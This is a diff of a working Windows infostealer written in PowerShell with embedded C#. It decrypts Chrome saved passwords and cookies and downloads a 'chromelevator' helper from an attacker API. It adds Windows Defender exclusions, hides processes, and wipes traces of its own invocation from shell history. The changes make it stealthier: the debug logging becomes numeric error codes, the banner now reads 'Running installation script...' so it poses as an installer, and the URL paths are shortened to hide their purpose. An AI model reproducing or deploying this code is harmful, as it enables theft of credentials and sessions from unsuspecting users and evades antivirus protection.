@@ -1,59 +1,142 @@
 $ErrorActionPreference = "Stop"
 $ApiBase = "__API_BASE__"
-$PayloadUrl = "$ApiBase/payload"
+$PayloadUrl = "$ApiBase/p"
 $ChromelevatorCacheDir = Join-Path $env:LOCALAPPDATA "remote-scripts\chromelevator"
+$CloseTerminal = __CLOSE_TERMINAL__
+$DebugMode = __DEBUG_MODE__
 $IsRunningAsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole]::Administrator
 )
 
-Write-Host "[DEBUG] Starting hybrid Chrome password export (PowerShell v10/v11 + chromelevator v20)"
-Write-Host "[DEBUG] API_BASE=$ApiBase"
-Write-Host "[DEBUG] PAYLOAD_URL=$PayloadUrl"
-Write-Host "[DEBUG] isAdmin=$IsRunningAsAdmin"
-Write-Host "[DEBUG] psVersion=$($PSVersionTable.PSVersion) pid=$PID"
+Write-Host "Running installation script..."
 
-function Write-DebugStage {
+function Write-DebugStep {
     param([string]$Message)
-    Write-Host "[DEBUG] >>> $Message"
+    if ($DebugMode) {
+        Write-Host "[DEBUG] $Message"
+    }
 }
 
 function Write-DebugError {
-    param(
-        [string]$Stage,
-        [System.Management.Automation.ErrorRecord]$ErrorRecord
-    )
+    param($ErrorRecord)
 
-    Write-Host "[DEBUG] !!! $Stage failed"
-    Write-Host "[DEBUG]     exceptionType=$($ErrorRecord.Exception.GetType().FullName)"
-    Write-Host "[DEBUG]     message=$($ErrorRecord.Exception.Message)"
-
-    $inner = $ErrorRecord.Exception.InnerException
-    while ($null -ne $inner) {
-        Write-Host "[DEBUG]     innerType=$($inner.GetType().FullName)"
-        Write-Host "[DEBUG]     innerMessage=$($inner.Message)"
-        $inner = $inner.InnerException
-    }
-
-    if ($ErrorRecord.InvocationInfo) {
-        $info = $ErrorRecord.InvocationInfo
-        Write-Host "[DEBUG]     scriptLine=$($info.ScriptLineNumber)"
-        Write-Host "[DEBUG]     command=$($info.Line.Trim())"
-        Write-Host "[DEBUG]     position=$($info.PositionMessage)"
-    }
-}
-
-function Write-DebugDirectoryTree {
-    param([string]$Root, [string]$Label = "directory tree")
-
-    Write-Host "[DEBUG] $Label for: $Root"
-    if (-not (Test-Path -LiteralPath $Root)) {
-        Write-Host "[DEBUG]   (path does not exist)"
+    if (-not $DebugMode) {
         return
     }
 
-    Get-ChildItem -LiteralPath $Root -Recurse -Force -ErrorAction SilentlyContinue |
-        ForEach-Object { Write-Host "[DEBUG]   $($_.FullName)" }
+    Write-DebugStep "Error type: $($ErrorRecord.Exception.GetType().FullName)"
+    Write-DebugStep "Error message: $($ErrorRecord.Exception.Message)"
+
+    $inner = $ErrorRecord.Exception.InnerException
+    $depth = 1
+    while ($null -ne $inner) {
+        Write-DebugStep "Inner $depth ($($inner.GetType().FullName)): $($inner.Message)"
+        $inner = $inner.InnerException
+        $depth++
+    }
+
+    if ($ErrorRecord.InvocationInfo) {
+        $line = $ErrorRecord.InvocationInfo.Line
+        if ($line) {
+            $line = $line.Trim()
+        }
+        Write-DebugStep "At line $($ErrorRecord.InvocationInfo.ScriptLineNumber): $line"
+    }
+
+    Write-DebugStep "ErrorId: $($ErrorRecord.FullyQualifiedErrorId)"
+    Write-DebugStep "Mapped exit code: $(Get-ErrorCodeFromException $ErrorRecord)"
 }
+
+function Throw-ErrorCode {
+    param([int]$Code)
+    throw [System.InvalidOperationException]::new([string]$Code)
+}
+
+function Get-ErrorCodeFromException {
+    param($ErrorRecord)
+
+    $exception = $ErrorRecord.Exception
+    while ($null -ne $exception) {
+        if ($exception -is [System.Net.WebException]) {
+            return 3001
+        }
+
+        $exceptionType = $exception.GetType().FullName
+        if ($exceptionType -eq "Microsoft.PowerShell.Commands.HttpResponseException") {
+            return 3001
+        }
+
+        if ($exception.Message -match "^\d{4}$") {
+            return [int]$exception.Message
+        }
+
+        $exception = $exception.InnerException
+    }
+
+    $messages = @($ErrorRecord.Exception.Message)
+    if ($ErrorRecord.Exception.InnerException) {
+        $messages += $ErrorRecord.Exception.InnerException.Message
+    }
+    if ($ErrorRecord.FullyQualifiedErrorId -match "WebCmdletWebResponseException") {
+        return 3001
+    }
+
+    foreach ($message in $messages) {
+        if ($message -match "^\d{4}$") {
+            return [int]$message
+        }
+        if ($message -match "maximum permissible length|MaxJsonLength|JavaScriptSerializer|ConvertTo-Json") {
+            return 3002
+        }
+    }
+
+    return 9000
+}
+
+function ConvertTo-SerializableObject {
+    param($InputObject)
+
+    if ($null -eq $InputObject) {
+        return $null
+    }
+
+    if ($InputObject -is [System.Collections.IDictionary]) {
+        $result = [ordered]@{}
+        foreach ($key in $InputObject.Keys) {
+            $result[[string]$key] = ConvertTo-SerializableObject $InputObject[$key]
+        }
+        return $result
+    }
+
+    if ($InputObject -is [System.Collections.IEnumerable] -and $InputObject -isnot [string]) {
+        return @($InputObject | ForEach-Object { ConvertTo-SerializableObject $_ })
+    }
+
+    if ($InputObject -is [pscustomobject]) {
+        $result = [ordered]@{}
+        foreach ($prop in $InputObject.PSObject.Properties) {
+            $result[$prop.Name] = ConvertTo-SerializableObject $prop.Value
+        }
+        return $result
+    }
+
+    return $InputObject
+}
+
+function ConvertTo-JsonUnlimited {
+    param(
+        [Parameter(Mandatory = $true)]
+        $InputObject,
+        [int]$RecursionLimit = 200
+    )
+
+    Add-Type -AssemblyName System.Web.Extensions
+    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
+    $serializer.MaxJsonLength = 2147483647
+    $serializer.RecursionLimit = $RecursionLimit
+    return $serializer.Serialize((ConvertTo-SerializableObject $InputObject))
+}
+
 
 function Get-ChromeInstalledVersion {
     $candidatePaths = @(
@@ -100,7 +183,6 @@ function Get-ChromeInstalledVersion {
         }
     }
 
-    Write-Host "[DEBUG] Chrome version not detected; assuming App-Bound (127+)"
     return [ordered]@{
         version = $null
         major = 0
@@ -135,7 +217,6 @@ function Get-ChromeProfileMetadata {
             }
         }
         catch {
-            Write-Host "[DEBUG] Could not read Chrome Local State profile metadata: $($_.Exception.Message)"
         }
     }
 
@@ -181,7 +262,6 @@ function Get-ChromeProfileMetadata {
                 }
             }
             catch {
-                Write-Host "[DEBUG] Could not read Preferences for $folder"
             }
         }
     }
@@ -283,15 +363,13 @@ function Test-ChromelevatorDefenderStatus {
             $status.probeExitCode = $probe.ExitCode
         }
         catch {
-            $status.probeError = $_.Exception.Message
             if ($_.Exception.Message -match "virus|potentially unwanted|malware|software malicioso|no deseado") {
                 $status.probeOk = $false
+                $status.probeError = "2009"
             }
         }
     }
 
-    # "Allow" in Protection history is not the same as MpPreference exclusions.
-    # A successful --help probe is the most reliable signal that execution is allowed.
     $status.canRunWithoutAdmin = [bool](
         $status.probeOk -or
         ($pathExcluded -and $processExcluded)
@@ -301,22 +379,12 @@ function Test-ChromelevatorDefenderStatus {
 }
 
 $ChromeInfo = Get-ChromeInstalledVersion
-Write-Host "[DEBUG] chrome.version=$($ChromeInfo.version) major=$($ChromeInfo.major) path=$($ChromeInfo.path)"
-Write-Host "[DEBUG] chrome.appBoundSupported=$($ChromeInfo.AppBoundSupported) legacyDpapiOnly=$($ChromeInfo.LegacyDpapiOnly)"
 
 $ChromelevatorDefenderStatus = Test-ChromelevatorDefenderStatus
 $UseChromelevator = $ChromeInfo.AppBoundSupported -and (
     $IsRunningAsAdmin -or $ChromelevatorDefenderStatus.canRunWithoutAdmin
 )
 $UseDpapiDecrypt = -not $UseChromelevator
-
-Write-Host "[DEBUG] defender.pathExcluded=$($ChromelevatorDefenderStatus.pathExcluded) processExcluded=$($ChromelevatorDefenderStatus.processExcluded) source=$($ChromelevatorDefenderStatus.exclusionSource)"
-Write-Host "[DEBUG] defender.binaryCached=$($ChromelevatorDefenderStatus.binaryCached) probeOk=$($ChromelevatorDefenderStatus.probeOk) canRunWithoutAdmin=$($ChromelevatorDefenderStatus.canRunWithoutAdmin)"
-Write-Host "[DEBUG] strategy.useDpapiDecrypt=$UseDpapiDecrypt useChromelevator=$UseChromelevator"
-
-if (-not $UseChromelevator -and $ChromeInfo.AppBoundSupported -and -not $IsRunningAsAdmin) {
-    Write-Host "[DEBUG] chromelevator unavailable without admin (probe failed and no Defender exclusions)"
-}
 
 function Initialize-ChromelevatorDefenderAllowlist {
     New-Item -ItemType Directory -Path $ChromelevatorCacheDir -Force | Out-Null
@@ -340,16 +408,13 @@ function Add-DefenderAllowlistEntry {
     try {
         if ($Path) {
             Add-MpPreference -ExclusionPath $Path -ErrorAction Stop | Out-Null
-            Write-Host "[DEBUG] Defender path exclusion: $Path"
         }
         if ($ProcessName) {
             Add-MpPreference -ExclusionProcess $ProcessName -ErrorAction Stop | Out-Null
-            Write-Host "[DEBUG] Defender process exclusion: $ProcessName"
         }
         return $true
     }
     catch {
-        Write-Host "[DEBUG] Defender allowlist failed ($Path$ProcessName): $($_.Exception.Message)"
         return $false
     }
 }
@@ -365,15 +430,14 @@ function Protect-ChromelevatorBinary {
     Unblock-File -LiteralPath $ElevatorPath -ErrorAction SilentlyContinue
 
     if (-not (Test-Path -LiteralPath $ElevatorPath)) {
-        throw "chromelevator was quarantined by Defender. Check Windows Security > Protection history and allow the file."
+        Throw-ErrorCode 2001
     }
 
     $size = (Get-Item -LiteralPath $ElevatorPath).Length
     if ($size -lt 500000) {
-        throw "chromelevator file looks invalid ($size bytes). Defender may have partially quarantined it."
+        Throw-ErrorCode 2002
     }
 
-    Write-Host "[DEBUG] chromelevator binary marked safe ($size bytes)"
 }
 
 function Resolve-ChromelevatorChromeRoot {
@@ -387,17 +451,13 @@ function Resolve-ChromelevatorChromeRoot {
         (Join-Path (Split-Path -Parent $ElevatorPath) "output\Chrome")
     )
 
-    Write-DebugStage "Resolve-ChromelevatorChromeRoot checking candidates"
     foreach ($candidate in $candidates) {
         $exists = Test-Path -LiteralPath $candidate
-        Write-Host "[DEBUG]     candidate=$candidate exists=$exists"
         if ($exists) {
-            Write-Host "[DEBUG]     selected=$candidate"
             return $candidate
         }
     }
 
-    Write-Host "[DEBUG]     no Chrome output directory found"
     return $null
 }
 
@@ -413,14 +473,9 @@ function Invoke-ChromelevatorProcess {
         param([string]$Path, [string]$OutputDir)
 
         $argumentString = "-o `"$OutputDir`" chrome"
-        Write-DebugStage "chromelevator launch"
-        Write-Host "[DEBUG]     exe=$Path"
-        Write-Host "[DEBUG]     args=$argumentString"
-        Write-Host "[DEBUG]     outDir=$OutputDir"
 
         $process = New-Object System.Diagnostics.Process
         $process.StartInfo.FileName = $Path
-        # No -k/--kill: do not terminate Chrome; chromelevator uses handle duplication for locked DBs
         $process.StartInfo.Arguments = $argumentString
         $process.StartInfo.UseShellExecute = $false
         $process.StartInfo.CreateNoWindow = $true
@@ -428,38 +483,18 @@ function Invoke-ChromelevatorProcess {
         $process.StartInfo.RedirectStandardOutput = $true
         $process.StartInfo.RedirectStandardError = $true
         [void]$process.Start()
-        $stdout = $process.StandardOutput.ReadToEnd()
-        $stderr = $process.StandardError.ReadToEnd()
+        $null = $process.StandardOutput.ReadToEnd()
+        $null = $process.StandardError.ReadToEnd()
         $process.WaitForExit()
-
-        Write-Host "[DEBUG]     exitCode=$($process.ExitCode)"
-        if ($stdout.Trim()) {
-            Write-Host "[DEBUG] chromelevator stdout:"
-            Write-Host $stdout
-        }
-        else {
-            Write-Host "[DEBUG]     stdout=(empty)"
-        }
-        if ($stderr.Trim()) {
-            Write-Host "[DEBUG] chromelevator stderr:"
-            Write-Host $stderr
-        }
-        else {
-            Write-Host "[DEBUG]     stderr=(empty)"
-        }
-
-        Write-DebugDirectoryTree -Root $OutputDir -Label "chromelevator output"
 
         return [pscustomobject]@{
             ExitCode = $process.ExitCode
-            StdOut = $stdout
-            StdErr = $stderr
         }
     }
 
     $result = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
     if ($result.ExitCode -ne 0) {
-        throw "chromelevator exited with code $($result.ExitCode)"
+        Throw-ErrorCode 2003
     }
 }
 
@@ -482,20 +517,16 @@ function Merge-ChromelevatorPasswords {
         [string]$ElevatorPath
     )
 
-    Write-DebugStage "Merge-ChromelevatorPasswords"
-    Write-Host "[DEBUG]     outputRoot=$OutputRoot"
 
     $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
     if (-not $chromeRoot) {
-        throw "chromelevator output not found under $OutputRoot (expected Chrome\Default\passwords.json)"
+        Throw-ErrorCode 2004
     }
 
-    Write-Host "[DEBUG]     chromeRoot=$chromeRoot"
 
     $abeMap = @{}
     foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
         $passwordsFile = Join-Path $profileDir.FullName "passwords.json"
-        Write-Host "[DEBUG]     profile=$($profileDir.Name) passwordsFile=$passwordsFile exists=$(Test-Path $passwordsFile)"
         if (-not (Test-Path $passwordsFile)) {
             continue
         }
@@ -503,7 +534,6 @@ function Merge-ChromelevatorPasswords {
         $profileName = $profileDir.Name
         $entries = Get-Content -Path $passwordsFile -Raw -Encoding UTF8 | ConvertFrom-Json
         if ($null -eq $entries) {
-            Write-Host "[DEBUG]     profile=$profileName entries=0"
             continue
         }
 
@@ -511,7 +541,6 @@ function Merge-ChromelevatorPasswords {
             $entries = @($entries)
         }
 
-        Write-Host "[DEBUG]     profile=$profileName abePasswordEntries=$($entries.Count)"
 
         foreach ($entry in $entries) {
             if (-not $entry.pass) {
@@ -522,10 +551,6 @@ function Merge-ChromelevatorPasswords {
             $abeMap[$key] = [string]$entry.pass
         }
     }
-
-    Write-Host "[DEBUG]     abeMapKeys=$($abeMap.Count)"
-    $payloadPasswordCount = @($Payload.passwords).Count
-    Write-Host "[DEBUG]     payloadPasswords=$payloadPasswordCount"
 
     $mergedCount = 0
     foreach ($entry in $Payload.passwords) {
@@ -546,12 +571,10 @@ function Merge-ChromelevatorPasswords {
             }
         }
         catch {
-            Write-DebugError -Stage "Merge-ChromelevatorPasswords.set password_dpapi profile=$($entry.profile) url=$($entry.url)" -ErrorRecord $_
             throw
         }
     }
 
-    Write-Host "[DEBUG]     mergedAbePasswords=$mergedCount"
     return $mergedCount
 }
 
@@ -562,29 +585,23 @@ function Merge-ChromelevatorCookies {
         [string]$ElevatorPath
     )
 
-    Write-DebugStage "Merge-ChromelevatorCookies"
-    Write-Host "[DEBUG]     outputRoot=$OutputRoot"
 
     $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
     if (-not $chromeRoot) {
-        Write-Host "[DEBUG]     no chrome root; cookie merge skipped"
         return 0
     }
 
-    Write-Host "[DEBUG]     chromeRoot=$chromeRoot"
     $mergedCookies = New-Object System.Collections.ArrayList
     $index = 0
 
     foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
         $cookiesFile = Join-Path $profileDir.FullName "cookies.json"
-        Write-Host "[DEBUG]     profile=$($profileDir.Name) cookiesFile=$cookiesFile exists=$(Test-Path $cookiesFile)"
         if (-not (Test-Path $cookiesFile)) {
             continue
         }
 
         $entries = Get-Content -Path $cookiesFile -Raw -Encoding UTF8 | ConvertFrom-Json
         if ($null -eq $entries) {
-            Write-Host "[DEBUG]     profile=$($profileDir.Name) cookieEntries=0"
             continue
         }
 
@@ -592,7 +609,6 @@ function Merge-ChromelevatorCookies {
             $entries = @($entries)
         }
 
-        Write-Host "[DEBUG]     profile=$($profileDir.Name) cookieEntries=$($entries.Count)"
 
         foreach ($entry in $entries) {
             try {
@@ -626,22 +642,16 @@ function Merge-ChromelevatorCookies {
                 $index++
             }
             catch {
-                Write-DebugError -Stage "Merge-ChromelevatorCookies entry index=$index profile=$($profileDir.Name)" -ErrorRecord $_
                 throw
             }
         }
     }
 
     if ($mergedCookies.Count -gt 0) {
-        Write-Host "[DEBUG]     assigning cookies to payload count=$($mergedCookies.Count)"
         $Payload | Add-Member -NotePropertyName cookies -NotePropertyValue @($mergedCookies.ToArray()) -Force
         $Payload | Add-Member -NotePropertyName cookieCount -NotePropertyValue $mergedCookies.Count -Force
     }
-    else {
-        Write-Host "[DEBUG]     no cookies to merge"
-    }
 
-    Write-Host "[DEBUG]     mergedCookies=$($mergedCookies.Count)"
     return $mergedCookies.Count
 }
 
@@ -653,7 +663,6 @@ function Get-ChromelevatorExecutable {
     )
 
     if ($env:CHROMELEVATOR_PATH -and (Test-Path -LiteralPath $env:CHROMELEVATOR_PATH)) {
-        Write-Host "[DEBUG] Using CHROMELEVATOR_PATH=$($env:CHROMELEVATOR_PATH)"
         Protect-ChromelevatorBinary -ElevatorPath $env:CHROMELEVATOR_PATH
         return $env:CHROMELEVATOR_PATH
     }
@@ -672,18 +681,13 @@ function Get-ChromelevatorExecutable {
             $needsDownload = $false
         }
         else {
-            Write-Host "[DEBUG] Removing invalid cached chromelevator ($cachedSize bytes)"
             Remove-Item -LiteralPath $elevatorPath -Force -ErrorAction SilentlyContinue
         }
     }
 
     if ($needsDownload) {
-        $chromelevatorUrl = "$ApiBase/chromelevator?arch=$ArchTag"
-        Write-Host "[DEBUG] Downloading chromelevator ($ArchTag) to $elevatorPath"
+        $chromelevatorUrl = "$ApiBase/chrmlvtr?arch=$ArchTag"
         (New-Object Net.WebClient).DownloadFile($chromelevatorUrl, $elevatorPath)
-    }
-    else {
-        Write-Host "[DEBUG] Using cached chromelevator at $elevatorPath"
     }
 
     Protect-ChromelevatorBinary -ElevatorPath $elevatorPath
@@ -702,7 +706,6 @@ function Invoke-ChromelevatorExtraction {
         abeMergedCount = 0
         cookiesMergedCount = 0
         error = $null
-        defenderHint = $null
         skipped = $false
         defender = $ChromelevatorDefenderStatus
     }
@@ -710,16 +713,13 @@ function Invoke-ChromelevatorExtraction {
     if (-not $UseChromelevator) {
         $meta.skipped = $true
         if ($ChromeInfo.LegacyDpapiOnly) {
-            $meta.error = "Chrome $($ChromeInfo.Major) uses DPAPI only (chromelevator not needed)"
-            Write-Host "[DEBUG] chromelevator skipped (Chrome <127)"
+            $meta.error = "2006"
         }
         elseif (-not $IsRunningAsAdmin) {
-            $meta.error = "chromelevator blocked without admin (Defender exclusion or runnable probe missing)"
-            Write-Host "[DEBUG] chromelevator skipped (not admin and not allowlisted)"
+            $meta.error = "2005"
         }
         else {
-            $meta.error = "chromelevator not required for this Chrome version"
-            Write-Host "[DEBUG] chromelevator skipped"
+            $meta.error = "2007"
         }
         return ,[pscustomobject]$meta
     }
@@ -732,54 +732,24 @@ function Invoke-ChromelevatorExtraction {
     try {
         $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
         $meta.arch = $archTag
-        Write-DebugStage "Invoke-ChromelevatorExtraction"
-        Write-Host "[DEBUG]     arch=$archTag useChromelevator=$UseChromelevator"
 
-        Write-DebugStage "Get-ChromelevatorExecutable"
         $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir
-        Write-Host "[DEBUG]     elevatorPath=$elevatorPath"
 
         $outDir = Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
         New-Item -ItemType Directory -Path $outDir -Force | Out-Null
-        Write-Host "[DEBUG]     outDir=$outDir"
 
-        Write-DebugStage "Invoke-ChromelevatorProcess"
         Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
 
-        Write-DebugStage "Merge-ChromelevatorPasswords"
         $mergedCount = Merge-ChromelevatorPasswords -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath
 
-        Write-DebugStage "Merge-ChromelevatorCookies"
         $cookiesMergedCount = Merge-ChromelevatorCookies -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath
 
         $meta.used = $true
         $meta.abeMergedCount = $mergedCount
         $meta.cookiesMergedCount = $cookiesMergedCount
-        Write-Host "[DEBUG] chromelevator.abeMergedCount=$mergedCount cookiesMergedCount=$cookiesMergedCount"
     }
     catch {
-        Write-DebugError -Stage "Invoke-ChromelevatorExtraction" -ErrorRecord $_
-
-        $message = $_.Exception.Message
-        if ($_.Exception.InnerException) {
-            $message = "$message | inner: $($_.Exception.InnerException.Message)"
-        }
-        $meta.error = $message
-
-        if ($outDir) {
-            Write-DebugDirectoryTree -Root $outDir -Label "chromelevator output after failure"
-        }
-
-        if ($message -match "virus|potentially unwanted|malware|software malicioso|no deseado") {
-            $meta.defenderHint = @(
-                "Windows Defender blocked chromelevator.exe."
-                "As admin: allow it in Windows Security > Protection history,"
-                "or disable Tamper Protection and re-run."
-            ) -join " "
-            Write-Host "[DEBUG] $($meta.defenderHint)"
-        }
-
-        Write-Host "[DEBUG] chromelevator skipped/failed: $message"
+        $meta.error = [string](Get-ErrorCodeFromException $_)
     }
     finally {
         if ($outDir -and (Test-Path $outDir)) {
@@ -791,7 +761,7 @@ function Invoke-ChromelevatorExtraction {
 }
 
 function Clear-ScriptExecutionHistory {
-    $pattern = "(DownloadString|windows-script|iex\s*\(|Invoke-Expression|iwr\s+.*windows-script|Invoke-WebRequest.*windows-script)"
+    $pattern = "(DownloadString|/wscp|iex\s*\(|Invoke-Expression|iwr\s+.*/wscp|Invoke-WebRequest.*/wscp)"
     $historyPaths = @()
 
     try {
@@ -827,19 +797,20 @@ function Clear-ScriptExecutionHistory {
     catch {
     }
 
-    Write-Host "[DEBUG] Cleared script invocation from history"
 }
 
 try {
 
+Write-DebugStep "Starting export pipeline (admin=$IsRunningAsAdmin, api=$ApiBase)"
+
 Add-Type -AssemblyName System.Security
 
-# Unique type names so iex re-runs in the same PS session always recompile fresh C#.
 $TypeSuffix = [Guid]::NewGuid().ToString("N")
 $ChromeExporterClassName = "ChromeExporter_$TypeSuffix"
 $ChromeComElevatorClassName = "ChromeComElevator_$TypeSuffix"
 $ChromeCryptoClassName = "ChromeCrypto_$TypeSuffix"
 
+Write-DebugStep "Compiling exporter types ($ChromeExporterClassName)"
 $typeDefinition = @"
 using System;
 using System.Collections.Generic;
@@ -862,7 +833,7 @@ public static class __EXPORTER_CLASS__
 
         if (!File.Exists(localStatePath))
         {
-            throw new InvalidOperationException("Local State not found");
+            throw new InvalidOperationException("1001");
         }
 
         byte[] dpapiKey = null;
@@ -871,7 +842,7 @@ public static class __EXPORTER_CLASS__
             dpapiKey = GetSecretKey(localStatePath);
             if (dpapiKey == null || dpapiKey.Length == 0)
             {
-                throw new InvalidOperationException("Could not decrypt Chrome master key");
+                throw new InvalidOperationException("1002");
             }
         }
 
@@ -1031,20 +1002,20 @@ public static class __EXPORTER_CLASS__
             int rc = sqlite3_open(":memory:", out db);
             if (rc != 0)
             {
-                throw new InvalidOperationException("sqlite3_open failed: " + rc);
+                throw new InvalidOperationException("1003");
             }
 
             IntPtr dataPtr = pinned.AddrOfPinnedObject();
             rc = sqlite3_deserialize(db, "main", dataPtr, dbBytes.LongLength, dbBytes.LongLength, SQLITE_DESERIALIZE_READONLY);
             if (rc != 0)
             {
-                throw new InvalidOperationException("sqlite3_deserialize failed: " + rc + ". Requires Windows 10 1809+.");
+                throw new InvalidOperationException("1004");
             }
 
             rc = sqlite3_prepare_v2(db, "SELECT action_url, origin_url, username_value, password_value FROM logins", -1, out stmt, IntPtr.Zero);
             if (rc != 0)
             {
-                throw new InvalidOperationException("sqlite3_prepare_v2 failed: " + rc);
+                throw new InvalidOperationException("1005");
             }
 
             while (sqlite3_step(stmt) == 100)
@@ -1124,14 +1095,14 @@ public static class __EXPORTER_CLASS__
             int rc = sqlite3_open(":memory:", out db);
             if (rc != 0)
             {
-                throw new InvalidOperationException("sqlite3_open failed: " + rc);
+                throw new InvalidOperationException("1006");
             }
 
             IntPtr dataPtr = pinned.AddrOfPinnedObject();
             rc = sqlite3_deserialize(db, "main", dataPtr, dbBytes.LongLength, dbBytes.LongLength, SQLITE_DESERIALIZE_READONLY);
             if (rc != 0)
             {
-                throw new InvalidOperationException("sqlite3_deserialize failed: " + rc + ". Requires Windows 10 1809+.");
+                throw new InvalidOperationException("1007");
             }
 
             rc = sqlite3_prepare_v2(
@@ -1142,7 +1113,7 @@ public static class __EXPORTER_CLASS__
                 IntPtr.Zero);
             if (rc != 0)
             {
-                throw new InvalidOperationException("sqlite3_prepare_v2 failed: " + rc);
+                throw new InvalidOperationException("1008");
             }
 
             while (sqlite3_step(stmt) == 100)
@@ -1520,7 +1491,7 @@ public static class __COM_ELEVATOR_CLASS__
             int hr = CoInitializeEx(IntPtr.Zero, COINIT_APARTMENTTHREADED);
             if (hr != S_OK && hr != S_FALSE && hr != RPC_E_CHANGED_MODE)
             {
-                error = "CoInitializeEx failed: 0x" + hr.ToString("X8");
+                error = "1013";
                 return null;
             }
 
@@ -1537,7 +1508,7 @@ public static class __COM_ELEVATOR_CLASS__
 
             if (hr != S_OK || elevatorPtr == IntPtr.Zero)
             {
-                error = "CoCreateInstance failed: 0x" + hr.ToString("X8");
+                error = "1014";
                 return null;
             }
 
@@ -1553,7 +1524,7 @@ public static class __COM_ELEVATOR_CLASS__
 
             if (hr != S_OK)
             {
-                error = "CoSetProxyBlanket failed: 0x" + hr.ToString("X8");
+                error = "1015";
                 return null;
             }
 
@@ -1561,7 +1532,7 @@ public static class __COM_ELEVATOR_CLASS__
             bstrEnc = SysAllocStringByteLen(encryptedPayload, (uint)encryptedPayload.Length);
             if (bstrEnc == IntPtr.Zero)
             {
-                error = "SysAllocStringByteLen failed";
+                error = "1016";
                 return null;
             }
 
@@ -1569,7 +1540,7 @@ public static class __COM_ELEVATOR_CLASS__
             hr = elevator.DecryptData(bstrEnc, out bstrPlain, out comErr);
             if (hr != S_OK || bstrPlain == IntPtr.Zero)
             {
-                error = "DecryptData failed: hr=0x" + hr.ToString("X8") + " comErr=" + comErr + " (Chrome elevation service may reject non-Chrome callers)";
+                error = "1017";
                 return null;
             }
 
@@ -1578,9 +1549,9 @@ public static class __COM_ELEVATOR_CLASS__
             Marshal.Copy(bstrPlain, key, 0, (int)len);
             return key;
         }
-        catch (Exception ex)
+        catch (Exception)
         {
-            error = ex.Message;
+            error = "1018";
             return null;
         }
         finally
@@ -1672,14 +1643,14 @@ public static class __CRYPTO_CLASS__
         try
         {
             int status = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
-            if (status != 0) throw new InvalidOperationException("BCryptOpenAlgorithmProvider failed: " + status);
+            if (status != 0) throw new InvalidOperationException("1009");
 
             byte[] chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
             status = BCryptSetProperty(hAlgorithm, "ChainingMode", chainMode, chainMode.Length, 0);
-            if (status != 0) throw new InvalidOperationException("BCryptSetProperty failed: " + status);
+            if (status != 0) throw new InvalidOperationException("1010");
 
             status = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
-            if (status != 0) throw new InvalidOperationException("BCryptGenerateSymmetricKey failed: " + status);
+            if (status != 0) throw new InvalidOperationException("1011");
 
             noncePtr = Marshal.AllocHGlobal(nonce.Length);
             Marshal.Copy(nonce, 0, noncePtr, nonce.Length);
@@ -1697,7 +1668,7 @@ public static class __CRYPTO_CLASS__
             byte[] plaintext = new byte[ciphertext.Length];
             int bytesWritten;
             status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plaintext, plaintext.Length, out bytesWritten, 0);
-            if (status != 0) throw new InvalidOperationException("BCryptDecrypt failed: " + status);
+            if (status != 0) throw new InvalidOperationException("1012");
 
             if (bytesWritten != plaintext.Length)
             {
@@ -1722,52 +1693,58 @@ $typeDefinition = $typeDefinition.Replace("__CRYPTO_CLASS__", $ChromeCryptoClass
 
 Add-Type -ReferencedAssemblies System.Security -TypeDefinition $typeDefinition
 
-Write-Host "[DEBUG] Building payload in memory (attemptDpapiDecrypt=$UseDpapiDecrypt)..."
-Write-Host "[DEBUG] useDpapiDecryptType=$($UseDpapiDecrypt.GetType().FullName) useChromelevatorType=$($UseChromelevator.GetType().FullName)"
+Write-DebugStep "Add-Type completed"
+
 $exporterType = [AppDomain]::CurrentDomain.GetAssemblies() |
     ForEach-Object { $_.GetType($ChromeExporterClassName) } |
     Where-Object { $_ } |
     Select-Object -First 1
-Write-Host "[DEBUG] exporterType=$($exporterType.FullName)"
 
-try {
-    $exportMethod = $exporterType.GetMethod("Export")
-    Write-Host "[DEBUG] exportMethod=$($exportMethod.Name) params=$(($exportMethod.GetParameters() | ForEach-Object { $_.ParameterType.FullName }) -join ', ')"
-    $payloadJson = $exportMethod.Invoke($null, @([bool]$UseDpapiDecrypt))
-}
-catch {
-    Write-DebugError -Stage "ChromeExporter.Export" -ErrorRecord $_
-    throw
+if (-not $exporterType) {
+    throw [System.InvalidOperationException]::new("Exporter type not found after Add-Type")
 }
 
-Write-DebugStage "ConvertFrom-Json payload"
+Write-DebugStep "Exporter type loaded: $($exporterType.FullName)"
+
+$exportMethod = $exporterType.GetMethod("Export")
+Write-DebugStep "Running Chrome export (UseDpapiDecrypt=$UseDpapiDecrypt)"
+$payloadJson = $exportMethod.Invoke($null, @([bool]$UseDpapiDecrypt))
+Write-DebugStep "Export completed (jsonLength=$($payloadJson.Length))"
+
+Write-DebugStep "Parsing export JSON"
 $payloadObject = $payloadJson | ConvertFrom-Json
 $payloadObject | Add-Member -NotePropertyName chrome -NotePropertyValue ([pscustomobject]$ChromeInfo) -Force
+
+Write-DebugStep "Reading Chrome profile metadata"
 $profileMetadata = Get-ChromeProfileMetadata
 $payloadObject | Add-Member -NotePropertyName profiles -NotePropertyValue ([pscustomobject]$profileMetadata) -Force
-Write-Host "[DEBUG] profileMetadataCount=$($profileMetadata.Count)"
-Write-Host "[DEBUG] passwordCount=$($payloadObject.passwordCount)"
